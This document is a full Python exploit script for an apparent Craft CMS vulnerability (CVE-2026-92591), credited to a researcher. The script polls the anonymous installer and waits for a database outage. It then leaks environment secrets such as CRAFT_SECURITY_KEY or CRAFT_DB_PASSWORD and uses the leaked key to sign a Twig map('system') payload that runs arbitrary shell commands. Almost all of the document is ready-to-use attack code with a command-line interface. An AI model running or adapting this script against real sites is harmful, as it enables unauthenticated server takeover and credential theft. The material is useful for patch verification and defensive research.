#!/usr/bin/env python3
"""Craft CMS unauthenticated environment disclosure -> RCE via database fail-open (CVE-2026-92591).

While the database is unreachable Craft believes it is not installed, so the
anonymous installer reopens. install/validate-site resolves ${VAR} in the site
name (disclosing CRAFT_SECURITY_KEY) and renders a signed `redirect` param as
unsandboxed Twig. The disclosed key signs a map('system') redirect the same action
renders. Disclosure fixed in Craft 5.10.13 (GHSA-hfjh-gw6x-7pv5); the redirect sink
is shared with CVE-2026-92592 (GHSA-5r92-75j8-c534).

The attacker cannot cause the outage. This grabs a CSRF token while the site is up
(a token is unnecessary if CSRF protection is off), then polls the installer and
fires the moment an outage opens it.
"""

import argparse
import base64
import hashlib
import hmac
import secrets
import os
import sys
import time
import urllib.parse

import requests

# --- self-contained terminal UI ---
_BANNER = r"""
  ____ ____      _    _____ _____
 / ___|  _ \    / \  |  ___|_   _|
| |   | |_) |  / _ \ | |_    | |
| |___|  _ <  / ___ \|  _|   | |
 \____|_| \_\/_/   \_\_|     |_|
"""
_COLOR = sys.stderr.isatty() and os.environ.get("NO_COLOR") is None


def _paint(code, text):
    return f"\033[{code}m{text}\033[0m" if _COLOR else text


def disable_color():
    global _COLOR
    _COLOR = False


def banner(subtitle):
    sys.stderr.write(_paint("36", _BANNER.strip("\n")) + "\n")
    sys.stderr.write("  " + _paint("2", subtitle) + "\n")
    sys.stderr.write("  " + _paint("2", "discovered by CryptoCat · cryptocat.me") + "\n\n")


def info(msg):
    sys.stderr.write(f" {_paint('36', '[*]')} {msg}\n")


def good(msg):
    sys.stderr.write(f" {_paint('32', '[+]')} {msg}\n")


def warn(msg):
    sys.stderr.write(f" {_paint('33', '[!]')} {msg}\n")


def bad(msg):
    sys.stderr.write(f" {_paint('31', '[-]')} {msg}\n")


def die(msg):
    bad(msg)
    sys.exit(1)


def output(data, label="command output"):
    good(label)
    sys.stderr.write(_paint("2", "  " + "-" * 60) + "\n")
    if isinstance(data, str):
        data = data.encode()
    sys.stdout.buffer.write(data)
    if data and not data.endswith(b"\n"):
        sys.stdout.buffer.write(b"\n")
    sys.stdout.buffer.flush()
# --- end terminal UI ---


def action(url, *parts):
    route = "/".join(urllib.parse.quote(p.strip("/"), safe="") for p in parts)
    return f"{url.rstrip('/')}/index.php?p={route}"


def twig(command, start, end):
    blob = base64.b64encode(f"printf %s {start}; {command}; printf %s {end}".encode()).decode()
    return "{{ ['printf %s " + blob + " | base64 -d | sh']|map('system')|join }}"


def validate_site(s, url, cp, trigger, csrf, body):
    return s.post(action(url, cp, trigger, "install", "validate-site"), json=body,
                  headers={"X-CSRF-Token": csrf} if csrf else {}, timeout=30)


def disclosed_name(resp, placeholder):
    try:
        name = resp.json().get("model", {}).get("name")
    except ValueError:
        return None
    return name if name and name != placeholder else None


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n"
               "  %(prog)s --url https://target.example --command id\n"
               "  %(prog)s --url https://target.example --env-name CRAFT_DB_PASSWORD\n")
    ap.add_argument("--url", required=True, metavar="URL", help="Craft base URL")
    ap.add_argument("--env-name", default="CRAFT_SECURITY_KEY", metavar="VAR", help="variable to read (default: CRAFT_SECURITY_KEY)")
    ap.add_argument("--command", metavar="CMD", help="run a command using the disclosed CRAFT_SECURITY_KEY")
    ap.add_argument("--cp-trigger", default="admin", metavar="T", help="control-panel trigger (default: admin)")
    ap.add_argument("--trigger", default="actions", metavar="T", help="action trigger (default: actions)")
    ap.add_argument("--interval", type=float, default=5.0, metavar="S", help="poll seconds while waiting for an outage (default: 5)")
    ap.add_argument("--max-wait", type=float, default=0.0, metavar="S", help="give up after S seconds (default: wait forever)")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification")
    ap.add_argument("--no-color", action="store_true", help="disable coloured output")
    args = ap.parse_args()
    if args.interval <= 0:
        ap.error("--interval must be positive")
    if args.no_color:
        disable_color()

    banner("unauthenticated DB fail-open disclosure -> RCE  ·  CVE-2026-92591")

    s = requests.Session()
    s.verify = not args.insecure
    s.headers["Accept"] = "application/json"
    if args.insecure:
        requests.packages.urllib3.disable_warnings()

    info("Acquiring a CSRF token while the site is up")
    csrf = s.get(action(args.url, args.trigger, "users", "session-info"), timeout=30).json().get("csrfTokenValue")
    good("Token acquired" if csrf else "No CSRF token returned (CSRF protection may be off)")

    name = "CRAFT_SECURITY_KEY" if args.command else args.env_name
    placeholder = "${" + name + "}"
    probe = {"name": placeholder, "baseUrl": "https://example.invalid", "language": "en-US"}
    info(f"Polling install/validate-site every {args.interval:g}s, waiting for a database outage")
    started, warned = time.monotonic(), False
    while True:
        r = validate_site(s, args.url, args.cp_trigger, args.trigger, csrf, probe)
        disclosed = disclosed_name(r, placeholder)
        if disclosed:
            break
        if r.status_code == 404:
            die("installer endpoint not found, check --cp-trigger and --trigger")
        if r.status_code == 400 and "already installed" not in r.text.lower():
            die("installer request rejected, likely an invalid CSRF token (HTTP 400)")
        if r.status_code not in (200, 400) and not warned:
            warn(f"unexpected response HTTP {r.status_code}, still polling")
            warned = True
        if args.max_wait and time.monotonic() - started > args.max_wait:
            die(f"no database outage within {args.max_wait:g}s")
        time.sleep(args.interval)

    good("Outage detected, installer is open")
    if not args.command:
        output(f"{name}={disclosed}", label="disclosed variable")
        return
    good(f"Disclosed {name} = {disclosed}")

    nonce = secrets.token_hex(8)
    start, end = f"S{nonce}", f"E{nonce}"
    payload = twig(args.command, start, end)
    signed = hmac.new(disclosed.encode(), payload.encode(), hashlib.sha256).hexdigest() + payload
    info("Signing a map('system') redirect with that key and firing it")
    resp = validate_site(s, args.url, args.cp_trigger, args.trigger, csrf,
                         {"name": "x", "baseUrl": "https://example.invalid",
                          "language": "en-US", "redirect": signed})
    try:
        redirect = resp.json().get("redirect", "")
    except ValueError:
        redirect = ""
    a = redirect.find(start)
    b = redirect.find(end, a + len(start))
    if a == -1 or b == -1:
        die("signed redirect was rejected or returned no command output")
    output(redirect[a + len(start):b])


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as e:
        die(f"request failed: {e}")
    except KeyboardInterrupt:
        sys.exit(130)
